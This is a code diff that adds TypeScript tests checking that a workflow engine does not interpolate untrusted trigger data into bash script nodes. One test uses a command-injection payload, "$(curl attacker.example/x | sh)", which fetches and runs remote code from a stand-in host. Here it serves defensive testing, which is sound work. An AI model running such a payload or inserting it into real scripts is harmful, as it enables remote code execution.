@@ -11,7 +11,12 @@ import {
 } from "../be/db";
 import type { Workflow, WorkflowDefinition } from "../types";
 import { shouldSkipCooldown } from "../workflows/cooldown";
-import { findReadyNodes, startWorkflowExecution, walkGraph } from "../workflows/engine";
+import {
+  findReadyNodes,
+  interpolateNodeConfig,
+  startWorkflowExecution,
+  walkGraph,
+} from "../workflows/engine";
 import {
   BaseExecutor,
   type ExecutorDependencies,
@@ -809,5 +814,70 @@ describe("Workflow Engine v2 (Phase 3)", () => {
         echo: "got: hello",
       });
     });
+  });
+});
+
+// ─── interpolateNodeConfig: script-node trigger-data injection guard ─────
+// (superagent.sh report c27edfd7, finding b132d7c5 — untrusted trigger data
+// interpolated into an unsandboxed workflow script node)
+
+describe("interpolateNodeConfig — script node", () => {
+  test("trigger data is NOT substituted into `config.script` (stays a literal, unresolved token)", () => {
+    const node = {
+      type: "script",
+      config: {
+        runtime: "bash",
+        script: "echo {{trigger.payload}}",
+      },
+    };
+    const ctx = { trigger: { payload: "$(curl attacker.example/x | sh)" } };
+
+    const { value, unresolved } = interpolateNodeConfig(node, ctx);
+
+    const script = (value as { script: string }).script;
+    expect(script).not.toContain("curl attacker.example");
+    // Blanked to empty (existing deepInterpolate behavior for an unresolved
+    // token), not substituted with the attacker-controlled value.
+    expect(script).toBe("echo ");
+    expect(unresolved).toContain("trigger.payload");
+  });
+
+  test("input/workflow/swarm/run data (operator- or system-authored) is still interpolated into the script", () => {
+    const node = {
+      type: "script",
+      config: { runtime: "bash", script: "echo {{input.greeting}}" },
+    };
+    const ctx = { input: { greeting: "hello" }, trigger: { payload: "ignored" } };
+
+    const { value, unresolved } = interpolateNodeConfig(node, ctx);
+
+    expect((value as { script: string }).script).toBe("echo hello");
+    expect(unresolved).toEqual([]);
+  });
+
+  test("trigger data remains available on other config fields (e.g. args), just not `script`", () => {
+    const node = {
+      type: "script",
+      config: {
+        runtime: "bash",
+        script: "echo hi",
+        args: ["{{trigger.id}}"],
+      },
+    };
+    const ctx = { trigger: { id: "abc-123" } };
+
+    const { value } = interpolateNodeConfig(node, ctx);
+
+    expect((value as { script: string }).script).toBe("echo hi");
+    expect((value as { args: string[] }).args).toEqual(["abc-123"]);
+  });
+
+  test("non-script node types are unaffected (trigger still interpolates normally)", () => {
+    const node = { type: "notify", config: { template: "hi {{trigger.name}}" } };
+    const ctx = { trigger: { name: "world" } };
+
+    const { value } = interpolateNodeConfig(node, ctx);
+
+    expect((value as { template: string }).template).toBe("hi world");
   });
 });
